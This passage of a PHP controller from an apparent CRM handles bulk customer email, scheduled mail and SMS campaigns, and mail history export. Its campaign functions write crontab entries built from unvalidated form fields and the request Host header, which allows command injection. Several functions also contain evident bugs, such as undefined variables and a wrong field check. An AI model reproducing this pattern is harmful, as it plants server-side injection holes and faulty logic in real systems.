        #check if not send campain mail

        if ($campain_id == '') {
            if (!empty($post)) {
                if (isset($post['type']) && $post['type'] == 'list') {
                    $cid = $this->get_customer_tmp('mail');
                    if (empty($cid)) {
                        $response = array('flag' => 'false', 'msg' => 'Không có khách hàng nào được chọn.');
                        echo json_encode($response);
                        return;
                    }
                } else {
                    $cid = $post['cid'];
                    $mail_template = $post['template_email_id'];
                    $customer_infos = $this->Customer->get_info_by_ids($cid);
                }
            }
        } else {
            $mail_campain = $this->Customer->get_all_mail_campain(array('id' => $campain_id))[0];
            $mail_template = $mail_campain['mail_id'];
            $customer_infos = $this->Customer->get_customer_in_smsEmail_group(array(), 10000, 0, $mail_campain['smsmail_group_id']);
        }


        $mail_info = $this->Customer->get_mail_template($mail_template);

        if (empty($mail_info) || empty($customer_infos)) return;

        $address_list = $body_list = $data_history = array();

        foreach ($customer_infos as $customer) {
            if (!empty($customer['email'])) {
                $content = $mail_info['mail_content'];
                $content = convert_content($content, $customer);
                $address_list[] = array(
                    'AddAddress' => $customer['email'],
                    'AddAddress_name' => $customer['first_name'] . ' ' . $customer['last_name'],
                );

                $body_list[] = $content;

                $data_history[] = array(
                    'person_id' => $customer['person_id'],
                    'employee_id' => $this->session->userdata('person_id'),
                    'title' => $mail_info['mail_title'],
                    'email' => $customer['email'],
                    'content' => $content,
                    'time' => date('Y-m-d H:i:s'),
                    'status' => 1,
                    'file' => '',
                );
            } else {
                $empty_mail[] = $customer['first_name'] . ' ' . $customer['last_name'];
            }
        }


        if (!empty($empty_mail)) {
            $mail_name_list = implode(', ', $empty_mail);
            $msg = $mail_name_list . ' không có địa chỉ email.';

            $response = array('flag' => 'false', 'msg' => $msg);
        } else {
            $mail['from_name'] = $this->config->item('company');
            $mail['address_list'] = serialize($address_list);
            $mail['subject'] = $mail_info['mail_title'];
            $mail['body'] = serialize($body_list);
            $mail['type'] = 'sequence';
            biz_send_mail($mail);
            $response = true;
            $this->Customer->save_mail_history($data_history, array('task' => 'update-multi'));
        }

        echo json_encode($response);

    }


    function save_list_send_mail($item_ids)
    {
        $item_ids = explode('~', $item_ids);
        $_SESSION['mail_total'] = count($item_ids);
        foreach ($item_ids as $item) {
            $info_cus = $this->Customer->get_info_person_by_id($item);
            if (isset($_SESSION['mail'][$item])) {
                continue;
            } else {
                $_SESSION['mail'][$info_cus['person_id']] = array(
                    'person_id' => $item,
                    'name' => $info_cus['first_name'] . " " . $info_cus['last_name'],
                    'email' => $info_cus['email'],
                );
            }
        }
        redirect('customers');
    }

    function manage_mail_temp()
    {
        $mailData = isset($_SESSION['mail']) ? $_SESSION['mail'] : array();
        $config['total_rows'] = count($mailData);
        $config['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
        $config['base_url'] = site_url('customers/sorting_mail');
        $this->pagination->initialize($config);
        $data['pagination'] = $this->pagination->create_links();
        $data['controller_name'] = $this->_controller_name;
        $data['per_page'] = $config['per_page'];
        $data['total_rows'] = $config['total_rows'];
        $data['manage_table'] = get_customer_manage_table($_SESSION['mail'], $this);

        $this->load->view("customers/manage_email_temp", $data);
    }

    function remove_mail_list()
    {
        $person_id = isset($_POST['ids']) ? $_POST['ids'] : '0';
        if ($person_id == 0) {
            unset($_SESSION['mail']);
            unset($_SESSION['mail_total']);
        } else {
            unset($_SESSION['mail'][$person_id]);
            $_SESSION['mail_total'] = count($_SESSION['mail_total']) - 1;
            echo count($_SESSION['mail']);
        }
    }

    #ThÃªm vÃ o danh sÃ¡ch táº¡m
    function save_list_send_all()
    {
        $item_ids = $this->input->post('items');
        $ck = $this->input->post('ck');

        $arr_all = $_SESSION['sms_mail_update'];

        foreach ($item_ids as $item) {
            $info_cus = $this->Customer->get_info_person_by_id($item);


            if (!array_key_exists($info_cus['person_id'], $arr_all)) {

                $arr_all[$info_cus['person_id']] = array(
                    'person_id' => $item,
                    'name' => $info_cus['first_name'] . " " . $info_cus['last_name'],
                    'email' => $info_cus['email'],
                    'phone_number' => $info_cus['phone_number'],


                );
            } else {
                $arr_all[$info_cus['person_id']]['send_mail'] = $smail;
                $arr_all[$info_cus['person_id']]['send_sms'] = $ssms;
            }
        }
        $_SESSION['sms_mail_update'] = $arr_all;
        echo json_encode(array('success' => true, 'message' => 'ThÃªm thÃ nh cÃ´ng cÃ´ng'));
    }

    #---------------------------------------------------------------------------------------------
    # MANAGE MAIL CAMPAIGN
    #==================================================================================

    /*
    * View  mail campain list
    *
    *
    * @return void
    */
    function manage_mail_campain()
    {
        # configuration for pagination
        $config['base_url'] = base_url() . 'customers/manage_mail_campain';
        $config['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
        $config['uri_segment'] = 3;
        $config['use_page_numbers'] = TRUE;


        # Save search condition default
        $arrParamsDefault = array(
            'search_text' => '',
            'order_col' => 'mail_campain_id',
            'order_dir' => 'asc',
            'page' => 1,
            'per_page' => $config['per_page'],
        );
        $_SESSION['arrParams1'] = isset($_SESSION['arrParams1']) ? $_SESSION['arrParams1'] : $arrParamsDefault;


        $arrParams = array(
            'search_text' => isset($_POST['search']) ? $this->input->post('search') : $_SESSION['arrParams1']['search_text'],
            'order_col' => $this->input->post('order_col') ? $this->input->post('order_col') : $_SESSION['arrParams1']['order_col'],
            'order_dir' => $this->input->post('order_dir') ? $this->input->post('order_dir') : $_SESSION['arrParams1']['order_dir'],
            'page' => $this->uri->segment(3) ? $this->uri->segment(3) : $_SESSION['arrParams1']['page'],
            'per_page' => $config['per_page'],
        );

        #save search condition for reload page
        $_SESSION['arrParams1'] = $arrParams;

        $config['total_rows'] = $this->Customer->count_all_mail_campain($arrParams);
        $this->pagination->initialize($config);

        $data['pagination'] = $this->pagination->my_Create_Links();
        $data['total_mail_campain'] = $this->Customer->count_all_mail_campain(array());
        $data['total_rows_mail_temp'] = $this->Customer->count_all_mail(array());
        $data['controller_name'] = $this->_controller_name;
        $data['form_width'] = $this->get_form_width();
        $data['per_page'] = $config['per_page'];
        $data['total_rows'] = $config['total_rows'];
        $data['baseUrl'] = $config['base_url'];
        $data['STT'] = ($arrParams['page'] - 1) * $arrParams['per_page'];
        $data['results'] = $this->Customer->get_all_mail_campain($arrParams);

        # get if pagination is true else show the master view
        if ($this->uri->segment(4) == 't') {
            echo json_encode(array('manage_table' => $this->load->view("customers/mail_campaign/manage_mail_campain_table", $data, TRUE), 'pagination' => $this->load->view("customers/pagination_view", $data, TRUE), 'total_row' => $data['total_rows']));
        } else {
            $this->load->view("customers/mail_campaign/manage_mail_campain", $data);
        }


    }

    /*
    * View  update or create mail campain
    *
    * @param mixed mail_campain_id: determine what action is (update or create)
    * else only save.
    * @return void
    */
    function view_mail_campain($mail_campain_id = '')
    {
        $this->load->helper('ckeditor');
        $data['ckeditor'] = array(
            #ID of the textarea that will be replaced
            'id' => 'mail_content',
            'path' => 'assets/js/biz/ckeditor/',
            'value' => '',

            #Optionnal values
            'config' => array(
                'toolbar' => "Full",   #Using the Full toolbar
                'width' => "100%",  #Setting a custom width
                'height' => "500px",     #Setting a custom height
                'language' => 'vi',
                'filebrowserBrowseUrl' => base_url() . 'assets/js/biz/ckfinder/ckfinder.html',
                'filebrowserImageBrowseUrl' => base_url() . 'assets/js/biz/ckfinder/ckfinder.html?Type=Images',
                'filebrowserImageUploadUrl' => base_url() . 'assets/js/biz/ckfinder/core/connector/php/connector.php?command=QuickUpload&type=Images',
            ),

            #Replacing styles from the "Styles tool"
            'styles' => array(

                #Creating a new style named "style 1"
                'style 1' => array(
                    'name' => 'Blue Title',
                    'element' => 'h2',

                    'styles' => array(
                        'color' => 'Blue',
                        'font-weight' => 'bold'
                    )
                ),

                #Creating a new style named "style 2"
                'style 2' => array(
                    'name' => 'Red Title',
                    'element' => 'h2',

                    'styles' => array(
                        'color' => 'Red',
                        'font-weight' => 'bold',
                        'text-decoration' => 'underline'
                    )
                )
            )
        );


        $mail_templates = $this->Customer->get_all_mail_template(array());
        $mail_campain = $this->Customer->get_all_mail_campain(array('id' => $mail_campain_id));
        foreach ($mail_templates as $mail_template) {
            $data['mail_templates'][$mail_template['mail_id']] = $mail_template;
        }
        $data['mail_campain'] = (empty($mail_campain[0])) ? '' : $mail_campain[0];
        $data['mail_campain_id'] = $mail_campain_id;
        $data['groups_sms_email'] = $this->Customer->get_all_customer_groups(array(), '', '');
        $this->load->view("customers/mail_campaign/create_update_mail_campain", $data);
    }

    /*
    * Save mail campain
    *
    * Save mail campain, and add crontab file, excute mail campain if active = 1
    * else only save.
    * @return void
    */

    function save_mail_campain()
    {
        $this->load->helper('date');
        $this->load->library('Crontabs');

        $mail_campain_id = $this->input->post('campain_id') ? $this->input->post('campain_id') : -1;
        $employee_id = $this->Employee->get_logged_in_employee_info()->person_id;
        $mail_campain_name = $this->input->post('mail_campain_name');
        $group_smsmail = $this->input->post('group_smsmail');
        $selectedTemp = $this->input->post('selectedTemp');
        $postdatetime = $this->input->post('postdatetime');

        # check post
        $postMinutes = ($this->input->post('postMinutes') || $this->input->post('postMinutes') === '0') ? $this->input->post('postMinutes') : '*';
        $postHours = ($this->input->post('postHours') || $this->input->post('postHours') === '0') ? $this->input->post('postHours') : '*';
        $postDaysOfWeek = ($this->input->post('postDaysOfWeek') || $this->input->post('postDaysOfWeek') === '0') ? $this->input->post('postDaysOfWeek') : '*';
        $postMonths = ($this->input->post('postMonths') || $this->input->post('postMonths') === '0') ? $this->input->post('postMonths') : '*';
        $postDays = ($this->input->post('postDays') || $this->input->post('postMonths') === '0') ? $this->input->post('postDays') : '*';
        $chk_active = $this->input->post('chk_active') ? $this->input->post('chk_active') : 0;
        $chk_edit_enable = $this->input->post('chk_edit_enable');

        # implode if var is array
        $postMinutes = is_array($postMinutes) ? implode(',', $postMinutes) : $postMinutes;
        $postHours = is_array($postHours) ? implode(',', $postHours) : $postHours;
        $postDaysOfWeek = is_array($postDaysOfWeek) ? implode(',', $postDaysOfWeek) : $postDaysOfWeek;
        $postMonths = is_array($postMonths) ? implode(',', $postMonths) : $postMonths;
        $postDays = is_array($postDays) ? implode(',', $postDays) : $postDays;


        #Save Edit mail campain but not edit time
        if ($chk_edit_enable == 0 && $mail_campain_id != -1) {
            $data = array(
                'mail_campain_name' => $mail_campain_name,
                'mail_id' => $selectedTemp,
                'smsmail_group_id' => $group_smsmail,
                'active' => $chk_active,
            );
            $this->Customer->update_mail_campain($data, $mail_campain_id);
            $mail_campain = $this->Customer->get_all_mail_campain(array('id' => $mail_campain_id))[0];

            $_postMinutes = $mail_campain['send_minutes'];
            $_postHours = $mail_campain['send_hours'];
            $_postMonths = $mail_campain['send_month'];
            $_postDays = $mail_campain['send_day_of_month'];
            $_postDaysOfWeek = $mail_campain['send_day_of_week'];

            if ($_postMinutes != '*' && $_postHours == '*') {
                $_postMinutesCron = '*/' . $_postMinutes;
            } else {
                $_postMinutesCron = $_postMinutes;
            }
            if ($chk_active == 0) {
                $command = $_postMinutesCron . ' ' . $_postHours . ' ' . $_postDays . ' ' . $_postMonths . ' ' . $_postDaysOfWeek . '  curl ' . "'https://" . $_SERVER['HTTP_HOST'] . '/Cronjob/do_send_mail/' . $mail_campain_id . "'";
                $this->crontabs->remove_job($command);
            }
            if ($chk_active == 1) {
                $command = $_postMinutesCron . ' ' . $_postHours . ' ' . $_postDays . ' ' . $_postMonths . ' ' . $_postDaysOfWeek . '  curl ' . "'https://" . $_SERVER['HTTP_HOST'] . '/Cronjob/do_send_mail/' . $mail_campain_id . "'";
                $this->crontabs->add_jobs($command);
            }
        } else {
            #save campain
            if ($postdatetime != '') {

                for ($i = 0; $i < count($postdatetime); $i++) {
                    $date = strtotime($postdatetime[$i]);

                    $postMinutes = date('i', $date);
                    $postHours = date('H', $date);
                    $postDays = date('d', $date);
                    $postMonths = date('m', $date);
                    $data = array(
                        'mail_campain_name' => $mail_campain_name,
                        'employee_id' => $employee_id,
                        'mail_id' => $selectedTemp,
                        'smsmail_group_id' => $group_smsmail,
                        'send_minutes' => $postMinutes,
                        'send_hours' => $postHours,
                        'send_month' => $postMonths,
                        'send_day_of_month' => $postDays,
                        'send_day_of_week' => $postDaysOfWeek,
                        'iterative_time' => 0,
                        'active' => $chk_active,
                    );

                    if ($mail_campain_id != -1) {
                        $mail_campain = $this->Customer->get_all_mail_campain(array('id' => $mail_campain_id))[0];

                        $_postMinutes = $mail_campain['send_minutes'];
                        $_postHours = $mail_campain['send_hours'];
                        $_postMonths = $mail_campain['send_month'];
                        $_postDays = $mail_campain['send_day_of_month'];
                        $_postDaysOfWeek = $mail_campain['send_day_of_week'];
                        if ($_postMinutes != '*' && $_postHours == '*') {
                            $_postMinutesCron = '*/' . $_postMinutes;
                        } else {
                            $_postMinutesCron = $_postMinutes;
                        }
                        $command = $_postMinutesCron . ' ' . $_postHours . ' ' . $_postDays . ' ' . $_postMonths . ' ' . $_postDaysOfWeek . '  curl ' . "'https://" . $_SERVER['HTTP_HOST'] . '/Cronjob/do_send_mail/' . $mail_campain_id . "'";
                        $this->crontabs->remove_job(trim($command));
                    }

                    $update = $this->Customer->update_mail_campain($data, $mail_campain_id);


                    # Create edit cron for mail campain
                    # Add new
                    if ($chk_active == 1 && $mail_campain_id == -1) {
                        $command = $postMinutes . ' ' . $postHours . ' ' . $postDays . ' ' . $postMonths . ' ' . $postDaysOfWeek . ' curl ' . "'https://" . $_SERVER['HTTP_HOST'] . '/Cronjob/do_send_mail/' . $update . "'";
                        $this->crontabs->add_jobs($command);
                    }
                    # Enable cron
                    if ($chk_active == 1 && $mail_campain_id != -1) {
                        $command = $postMinutes . ' ' . $postHours . ' ' . $postDays . ' ' . $postMonths . ' ' . $postDaysOfWeek . '  curl ' . "'https://" . $_SERVER['HTTP_HOST'] . '/Cronjob/do_send_mail/' . $mail_campain_id . "'";
                        $this->crontabs->add_jobs($command);
                    }
                }
            } else {
                #change post minute for loop each n minutes
                if ($postMinutes != '*' && $postHours == '*') {
                    $postMinutesCron = '*/' . $postMinutes;
                } else {
                    $postMinutesCron = $postMinutes;
                }
                $data = array(
                    'mail_campain_name' => $mail_campain_name,
                    'employee_id' => $employee_id,
                    'mail_id' => $selectedTemp,
                    'smsmail_group_id' => $group_smsmail,
                    'send_minutes' => $postMinutes,
                    'send_hours' => $postHours,
                    'send_month' => $postMonths,
                    'send_day_of_month' => $postDays,
                    'send_day_of_week' => $postDaysOfWeek,
                    'iterative_time' => 1,
                    'active' => $chk_active,
                );

                if ($mail_campain_id != -1) {
                    $mail_campain = $this->Customer->get_all_mail_campain(array('id' => $mail_campain_id));

                    $_postMinutes = $mail_campain['send_minutes'];
                    $_postHours = $mail_campain['send_hours'];
                    $_postMonths = $mail_campain['send_month'];
                    $_postDays = $mail_campain['send_day_of_month'];
                    $_postDaysOfWeek = $mail_campain['send_day_of_week'];
                    if ($_postMinutes != '*' && $_postHours == '*') {
                        $_postMinutesCron = '*/' . $_postMinutes;
                    } else {
                        $_postMinutesCron = $_postMinutes;
                    }
                    $command = $_postMinutesCron . ' ' . $_postHours . ' ' . $_postDays . ' ' . $_postMonths . ' ' . $_postDaysOfWeek . '  curl ' . "'https://" . $_SERVER['HTTP_HOST'] . '/Cronjob/do_send_mail/' . $mail_campain_id . "'";
                    $this->crontabs->remove_job(trim($command));
                }
                $update = $this->Customer->update_mail_campain($data, $mail_campain_id);

                # Create edit cron for mail campain
                # Add new
                if ($chk_active == 1 && $mail_campain_id == -1) {
                    $command = $postMinutesCron . ' ' . $postHours . ' ' . $postDays . ' ' . $postMonths . ' ' . $postDaysOfWeek . ' curl ' . "'https://" . $_SERVER['HTTP_HOST'] . '/Cronjob/do_send_mail/' . $update . "'";
                    $this->crontabs->add_jobs($command);

                }
                #Enable cron
                if ($chk_active == 1 && $mail_campain_id != -1) {
                    $command = $postMinutesCron . ' ' . $postHours . ' ' . $postDays . ' ' . $postMonths . ' ' . $postDaysOfWeek . '  curl ' . "'https://" . $_SERVER['HTTP_HOST'] . '/Cronjob/do_send_mail/' . $mail_campain_id . "'";
                    $this->crontabs->add_jobs($command);
                }

            }
        }

    }


    /*
    * Delete mail campain
    *
    * @return void
    */
    function manage_mail_campain_delete()
    {
        $post = $this->input->post();
        if (!empty($post)) {

            foreach ($post['items'] as $item) {
                $mail_campain = $this->Customer->get_all_mail_campain(array('id' => $item))[0];
                $_postMinutes = $mail_campain['send_minutes'];
                $_postHours = $mail_campain['send_hours'];
                $_postMonths = $mail_campain['send_month'];
                $_postDays = $mail_campain['send_day_of_month'];
                $_postDaysOfWeek = $mail_campain['send_day_of_week'];
                if ($_postMinutes != '*' && $_postHours == '*') {
                    $_postMinutesCron = '*/' . $_postMinutes;
                } else {
                    $_postMinutesCron = $_postMinutes;
                }
                $command = $_postMinutesCron . ' ' . $_postHours . ' ' . $_postDays . ' ' . $_postMonths . ' ' . $_postDaysOfWeek . '  curl ' . "'https://" . $_SERVER['HTTP_HOST'] . '/Cronjob/do_send_mail/' . $item . "'";
                $this->crontabs->remove_job(trim($command));
            }
            $this->Customer->delete_mail_campain(array('mail_campain_id' => $post['items']));
            $response = array('flag' => 'true', 'msg' => lang('common_success'));
            echo json_encode($response);
        }
    }
    #-------------------------------------------------------
    # MANAGE MAIL HISTORY
    #========================================================

    function manage_mail_history_input()
    {
        foreach ($this->Customer->get_all_customer_groups(array(), '', '') as $smsmail_group) {
            $smsmail_groups[$smsmail_group->smsmail_group_id] = $smsmail_group->name;
        }
        foreach ($this->Customer->get_all_mail_campain(array()) as $mail_campain) {
            $mail_campains[$mail_campain['mail_campain_id']] = $mail_campain['mail_campain_name'];
        }
        $data['smsmail_groups'] = (empty($smsmail_groups)) ? '' : $smsmail_groups;
        $data['mail_campains'] = (empty($mail_campains)) ? '' : $mail_campains;
        $data['total_mail_campain'] = $this->Customer->count_all_mail_campain(array());
        $data['total_rows_mail_temp'] = $this->Customer->count_all_mail(array());
        $data['report_date_range_simple'] = get_simple_date_ranges(TRUE);
        $this->load->view('customers/mail_history/manage_mail_history', $data);
    }


    function manage_mail_history_detail($start_date, $end_date, $view_type = 0, $export_excel = 0)
    {

        $params = array();
        $params['start_date'] = str_replace('%20', ' ', $start_date);
        $params['end_date'] = str_replace('%20', ' ', $end_date);
        if (substr($view_type, 0, 4) == 'grp_') {
            $params['smsmail_group_id'] = substr($view_type, 4);
        }
        if (substr($view_type, 0, 4) == 'cmp_') {
            $params['mail_campain_id'] = substr($view_type, 4);
        }

        #export to excel base on input options
        if ($export_excel == 1) {
            $title = 'Lịch sử gửi mail';
            $rows = array();
            $row = array();

            $_headers = array(

                array(
                    'col' => 'A',
                    'value_field' => '__AUTO__',
                ),
                array(
                    'col' => 'B',
                    'value_field' => 'last_name',
                ),
                array(
                    'col' => 'C',
                    'value_field' => 'mh_email',
                ),
                array(
                    'col' => 'D',
                    'value_field' => 'mh_title',
                ),

                array(
                    'col' => 'E',
                    'value_field' => 'mh_content',
                ),
                array(
                    'col' => 'F',
                    'value_field' => 'status_',
                ),

            );


            $bizExcel = new BizExcel('ASendSMSEmailHistory.xlsx');
            $bizExcel->setNumberRowStartBody(4)->setHeaderOfBody($_headers);
            $items = $this->Customer->get_mail_history($params);
            $bizExcel->setDataExcel($items);
            $bizExcel->addToNewSheet('Lịch sử gửi mail')->generateFile(false, '', false);
            $excelContent = $bizExcel->generateFile(false);
            $this->load->helper('download');
            force_download('Lich_su_gui_mail.xlsx', $excelContent);
        } #show view if export excel does not selected
        else {

            # configuration for pagination
            $config['base_url'] = base_url() . 'customers/manage_mail_history_detail/' . $start_date . '/' . $end_date . '/' . $view_type . '/0';
            $config['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
            $config['uri_segment'] = 7;
            $config['use_page_numbers'] = TRUE;


            # Search condition default
            $arrParamsDefault = array();

            if (substr($view_type, 0, 4) == 'grp_') {
                $arrParamsDefault['smsmail_group_id'] = substr($view_type, 4);
                $arrParams['smsmail_group_id'] = substr($view_type, 4);
            }
            if (substr($view_type, 0, 4) == 'cmp_') {
                $arrParamsDefault['mail_campain_id'] = substr($view_type, 4);
                $arrParams['mail_campain_id'] = substr($view_type, 4);
            }
            $arrParamsDefault['start_date'] = str_replace('%20', ' ', $start_date);
            $arrParamsDefault['end_date'] = str_replace('%20', ' ', $end_date);
            $arrParamsDefault['search_text'] = '';
            $arrParamsDefault['order_col'] = 'mh.id';
            $arrParamsDefault['order_dir'] = 'asc';
            $arrParamsDefault['page'] = 1;
            $arrParamsDefault['per_page'] = $config['per_page'];

            #save search default
            $_SESSION['arrParamsMailHistory'] = isset($_SESSION['arrParamsMailHistory']) ? $_SESSION['arrParamsMailHistory'] : $arrParamsDefault;


            $arrParams['search_text'] = isset($_POST['search']) ? $this->input->post('search') : $_SESSION['arrParamsMailHistory']['search_text'];
            $arrParams['order_col'] = $this->input->post('order_col') ? $this->input->post('order_col') : $_SESSION['arrParamsMailHistory']['order_col'];
            $arrParams['order_dir'] = $this->input->post('order_dir') ? $this->input->post('order_dir') : $_SESSION['arrParamsMailHistory']['order_dir'];
            $arrParams['page'] = $this->uri->segment(7) ? $this->uri->segment(7) : $_SESSION['arrParamsMailHistory']['page'];
            $arrParams['per_page'] = $config['per_page'];
            $arrParams['start_date'] = str_replace('%20', ' ', $start_date);
            $arrParams['end_date'] = str_replace('%20', ' ', $end_date);
            #save search condition for reload page

            $_SESSION['arrParamsMailHistory'] = $arrParams;
            $config['total_rows'] = $this->Customer->count_mail_history($arrParams);
            $this->pagination->initialize($config);
            $data['pagination'] = $this->pagination->my_Create_Links();
            $data['total_mail_campain'] = $this->Customer->count_all_mail_campain(array());
            $data['total_rows_mail_temp'] = $this->Customer->count_all_mail(array());
            $data['controller_name'] = $this->_controller_name;
            $data['form_width'] = $this->get_form_width();
            $data['per_page'] = $config['per_page'];
            $data['total_rows'] = $config['total_rows'];
            $data['baseUrl'] = $config['base_url'];
            $data['STT'] = ($arrParams['page'] - 1) * $arrParams['per_page'];
            $data['results'] = $this->Customer->get_mail_history($arrParams);

            # get if pagination is true else show the master view
            if ($this->uri->segment(8) == 't') {
                echo json_encode(array('manage_table' => $this->load->view("customers/mail_history/manage_mail_history_table", $data, TRUE), 'pagination' => $this->load->view("customers/pagination_view", $data, TRUE), 'total_row' => $data['total_rows']));
            } else {
                $this->load->view("customers/mail_history/manage_mail_history_detail", $data);
            }
        }

    }

    function manage_mail_history_delete()
    {
        $post = $this->input->post();
        if (!empty($post)) {

            if ($this->Customer->delete_mail_history(array('mail_history_id' => $post['items'])))
                $response = array('flag' => 'true', 'msg' => lang('common_success'));
            else
                $response = array('flag' => 'false', 'msg' => lang('common_error'));
            echo json_encode($response);
        }
    }
    #-------------------------------------------------------
    # MANAGE SMS CAMPAIGN
    #========================================================


    function manage_sms_campain()
    {
        # configuration for pagination
        $config['base_url'] = base_url() . 'customers/manage_sms_campain';
        $config['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
        $config['uri_segment'] = 3;
        $config['use_page_numbers'] = TRUE;


        # Save search condition default
        $arrParamsDefault = array(
            'search_text' => '',
            'order_col' => 'sms_campain_id',
            'order_dir' => 'asc',
            'page' => 1,
            'per_page' => $config['per_page'],
        );
        $_SESSION['arrParamsSmsCampain'] = isset($_SESSION['arrParamsSmsCampain']) ? $_SESSION['arrParamsSmsCampain'] : $arrParamsDefault;


        $arrParams = array(
            'search_text' => isset($_POST['search']) ? $this->input->post('search') : $_SESSION['arrParamsSmsCampain']['search_text'],
            'order_col' => $this->input->post('order_col') ? $this->input->post('order_col') : $_SESSION['arrParamsSmsCampain']['order_col'],
            'order_dir' => $this->input->post('order_dir') ? $this->input->post('order_dir') : $_SESSION['arrParamsSmsCampain']['order_dir'],
            'page' => $this->uri->segment(3) ? $this->uri->segment(3) : $_SESSION['arrParamsSmsCampain']['page'],
            'per_page' => $config['per_page'],
        );

        #save search condition for reload page
        $_SESSION['arrParamsSmsCampain'] = $arrParams;

        $config['total_rows'] = $this->Customer->count_all_sms_campain($arrParams);
        $this->pagination->initialize($config);

        $data['pagination'] = $this->pagination->my_Create_Links();
        $data['total_rows_sms_temp'] = $this->Customer->count_all_sms($arrParams1 = array());
        $data['controller_name'] = $this->_controller_name;
        $data['form_width'] = $this->get_form_width();
        $data['per_page'] = $config['per_page'];
        $data['total_rows'] = $config['total_rows'];
        $data['baseUrl'] = $config['base_url'];
        $data['results'] = $this->Customer->get_all_sms_campain($arrParams);

        # get if pagination is true else show the master view
        if ($this->uri->segment(4) == 't') {
            echo json_encode(array('manage_table' => $this->load->view("customers/sms_campaign/manage_sms_campain_table", $data, TRUE), 'pagination' => $this->load->view("customers/pagination_view", $data, TRUE), 'total_row' => $data['total_rows']));
        } else {
            $this->load->view("customers/sms_campaign/manage_sms_campain", $data);
        }


    }

    function view_sms_campain($sms_campain_id = '')
    {
        $this->load->helper('ckeditor');
        $data['ckeditor'] = array(
            #ID of the textarea that will be replaced
            'id' => 'sms_content',
            'path' => 'assets/js/biz/ckeditor/',
            'value' => '',

            #Optionnal values
            'config' => array(
                'toolbar' => "Full",    #Using the Full toolbar
                'width' => "100%",  #Setting a custom width
                'height' => '500px',     #Setting a custom height
                'language' => 'vi',
                'filebrowserBrowseUrl' => base_url() . 'assets/js/biz/ckfinder/ckfinder.html',
                'filebrowserImageBrowseUrl' => base_url() . 'assets/js/biz/ckfinder/ckfinder.html?Type=Images',
                'filebrowserImageUploadUrl' => base_url() . 'assets/js/biz/ckfinder/core/connector/php/connector.php?command=QuickUpload&type=Images',
            ),

            #Replacing styles from the "Styles tool"
            'styles' => array(

                #Creating a new style named "style 1"
                'style 1' => array(
                    'name' => 'Blue Title',
                    'element' => 'h2',

                    'styles' => array(
                        'color' => 'Blue',
                        'font-weight' => 'bold'
                    )
                ),

                #Creating a new style named "style 2"
                'style 2' => array(
                    'name' => 'Red Title',
                    'element' => 'h2',

                    'styles' => array(
                        'color' => 'Red',
                        'font-weight' => 'bold',
                        'text-decoration' => 'underline'
                    )
                )
            )
        );


        $sms_templates = $this->Customer->get_all_sms_template(array());
        $sms_campain = $this->Customer->get_all_sms_campain(array('id' => $sms_campain_id));
        foreach ($sms_templates as $sms_template) {
            $data['sms_templates'][$sms_template['id']] = $sms_template;
        }
        $data['sms_campain'] = (empty($sms_campain[0])) ? '' : $sms_campain[0];
        $data['sms_campain_id'] = $sms_campain_id;
        $data['groups_sms_email'] = $this->Customer->get_all_customer_groups(array(), '', '');
        $this->load->view("customers/sms_campaign/create_update_sms_campain", $data);
    }

    function save_sms_campain()
    {
        $this->load->helper('date');
        $this->load->library('Crontabs');

        $sms_campain_id = $this->input->post('campain_id') ? $this->input->post('campain_id') : -1;
        $sms_campain_name = $this->input->post('sms_campain_name');
        $group_smsmail = $this->input->post('group_smsmail');
        $selectedTemp = $this->input->post('selectedTemp');
        $postdatetime = $this->input->post('postdatetime');

        #check post
        $postMinutes = ($this->input->post('postMinutes') || $this->input->post('postMinutes') === '0') ? $this->input->post('postMinutes') : '*';
        $postHours = ($this->input->post('postHours') || $this->input->post('postHours') === '0') ? $this->input->post('postHours') : '*';
        $postDaysOfWeek = ($this->input->post('postDaysOfWeek') || $this->input->post('postDaysOfWeek') === '0') ? $this->input->post('postDaysOfWeek') : '*';
        $postMonths = ($this->input->post('postMonths') || $this->input->post('postMonths') === '0') ? $this->input->post('postMonths') : '*';
        $postDays = ($this->input->post('postDays') || $this->input->post('postMonths') === '0') ? $this->input->post('postDays') : '*';
        $chk_active = $this->input->post('chk_active') ? $this->input->post('chk_active') : 0;
        $chk_edit_enable = $this->input->post('chk_edit_enable');

        # implode if var is array
        $postMinutes = is_array($postMinutes) ? implode(',', $postMinutes) : $postMinutes;
        $postHours = is_array($postHours) ? implode(',', $postHours) : $postHours;
        $postDaysOfWeek = is_array($postDaysOfWeek) ? implode(',', $postDaysOfWeek) : $postDaysOfWeek;
        $postMonths = is_array($postMonths) ? implode(',', $postMonths) : $postMonths;
        $postDays = is_array($postDays) ? implode(',', $postDays) : $postDays;

        #Edit sms campain but not edit time
        if ($chk_edit_enable == 0 && $sms_campain_id != -1) {
            $data = array(
                'sms_campain_name' => $sms_campain_name,
                'sms_id' => $selectedTemp,
                'smsmail_group_id' => $group_smsmail,
                'active' => $chk_active,
            );
            $this->Customer->update_sms_campain($data, $sms_campain_id);
        } else {
            if ($postdatetime != '') {
                for ($i = 0; $i < count($postdatetime); $i++) {
                    $date = strtotime($postdatetime[$i]);

                    $postMinutes = date('i', $date);
                    $postHours = date('H', $date);
                    $postDays = date('d', $date);
                    $postMonths = date('m', $date);
                    $data = array(
                        'sms_campain_name' => $sms_campain_name,
                        'sms_id' => $selectedTemp,
                        'smsmail_group_id' => $group_smsmail,
                        'send_minutes' => $postMinutes,
                        'send_hours' => $postHours,
                        'send_month' => $postMonths,
                        'send_day_of_month' => $postDays,
                        'send_day_of_week' => $postDaysOfWeek,
                        'iterative_time' => 0,
                        'active' => $chk_active,
                    );

                    $update = $this->Customer->update_sms_campain($data, $sms_campain_id);


                }
            } else {

                #change post minute for loop each n minutes
                if ($postMinutes != '*' && empty($postHours)) {
                    $postMinutesCron = '*/' . $postMinutes;
                } else {
                    # var_dump($postHours);
                    $postMinutesCron = $postMinutes;
                }
                $data = array(
                    'sms_campain_name' => $sms_campain_name,
                    'sms_id' => $selectedTemp,
                    'smsmail_group_id' => $group_smsmail,
                    'send_minutes' => $postMinutes,
                    'send_hours' => $postHours,
                    'send_month' => $postMonths,
                    'send_day_of_month' => $postDays,
                    'send_day_of_week' => $postDaysOfWeek,
                    'iterative_time' => 1,
                    'active' => $chk_active,
                );
                $update = $this->Customer->update_sms_campain($data, $sms_campain_id);

            }
        }
    }

